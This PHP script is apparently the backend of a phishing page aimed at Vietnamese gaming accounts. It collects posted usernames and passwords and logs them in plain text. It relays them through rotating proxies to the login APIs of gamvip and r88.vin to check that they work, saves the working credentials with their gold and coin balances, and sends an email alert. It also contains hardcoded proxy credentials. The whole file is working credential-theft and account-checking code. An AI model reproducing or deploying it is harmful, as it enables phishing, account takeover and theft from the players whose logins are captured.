<?php

$to_email = "congtuuit@gmail.com";
$subject = "Simple Email Test via PHP";

//function SendEmail($to_email, $message)
//{
//    $subject = 'User Data Log';
//    $headers = 'From: noreply@company.com';
//    mail($to_email,$subject,$message,$headers);
//}

//$username = $_POST['$username'];
//$password = $_POST['$password'];

$username = $_POST['un'];
$password = $_POST['pww'];
$passwordMD5 = md5($password);

$data = array(
    'Username' => $username,
    'Password' => $password,
    'Md5Password' => md5($password) ,
    'OTP' => '',
    'Captcha' => '',
    'Verify' => '',
);

$ch = curl_init();
$proxies = require "proxies.php";
$proxy = $proxies[array_rand($proxies)];
$ch = curl_init();

curl_setopt($ch, CURLOPT_PROXY, $proxy);    
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTPS');  
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'hugobosss1606:Nokia11000');
curl_setopt($ch, CURLOPT_URL, 'https://id.gamvip.com/api/Account/authenticate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( $data ) );
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Referer: https://gamvip.com/';
$headers[] = 'Origin: https://gamvip.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
$headers[] = 'Content-Type: application/json';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
file_put_contents('api_error_log.txt', $username.'|'.$password.PHP_EOL , FILE_APPEND | LOCK_EX);   

$result = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}

curl_close ($ch);
$data_json = array();
$data_result = json_decode( $result );
$data_array = $data_result->d;

if($data_array->accountID) {
    if ( ! $data_array->accountID ) {

        $data_json['code'] = 0;
        $data_json['msg']  = 'Tài khoản hoặc mật khẩu không đúng';
        $data_json['url']  = '#';

    } else {
        $data_json['code'] = 1;
        $data_json['game'] = 'Gam';
        $data_json['gold'] = $data_array->goldBalance;
        $data_json['coin'] = $data_array->coinBalance;
        $data_json['msg']  = 'Đăng nhập thành công';
        
        file_put_contents('login_success.txt', $username. "|" . $password . PHP_EOL, FILE_APPEND | LOCK_EX);

        //SendEmail
        $body = "Hi,nn This is test email send by PHP Script";
        $headers = "From: sender\'s email";
 
        if (mail($to_email, $subject, $body, $headers)) {
            echo json_encode( "OK" );
        } else {
           echo json_encode( "NOT OK" );
        }


    }

} else {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://id.r88.vin/api/Account/authenticate');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( $data ) );
    curl_setopt($ch, CURLOPT_POST, 1); 
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers = array();
    $headers[] = 'Accept: application/json';
    $headers[] = 'Referer: https://r88.vin/';
    $headers[] = 'Origin: https://r88.vin/';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';
    $headers[] = 'Content-Type: application/json';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }

    curl_close ($ch);
    $data_json = array();
    $data_result = json_decode( $result );
    $data_array = $data_result->d;

    if ( ! $data_array->accountID ) {
        $data_json['code'] = 0;
        $data_json['msg']  = 'Tài khoản hoặc mật khẩu không đúng';
        $data_json['url']  = '#';
    } else {
        $data_json['code'] = 1;
        $data_json['game'] = 'R88';
        $data_json['gold'] = $data_array->goldBalance;
        $data_json['coin'] = $data_array->coinBalance;
        $data_json['msg']  = 'Đăng nhập thành công';

        file_put_contents('login_success.txt', $username. "|" . $password . PHP_EOL, FILE_APPEND | LOCK_EX);

       //SendEmail
        $body = "Hi,nn This is test email send by PHP Script";
        $headers = "From: sender\'s email";
 
        if (mail($to_email, $subject, $body, $headers)) {
            echo json_encode( "OK" );
        } else {
           echo json_encode( "NOT OK" );
        }


    }
}

header( 'Content-Type: application/json' );
echo json_encode( $data_json );
?>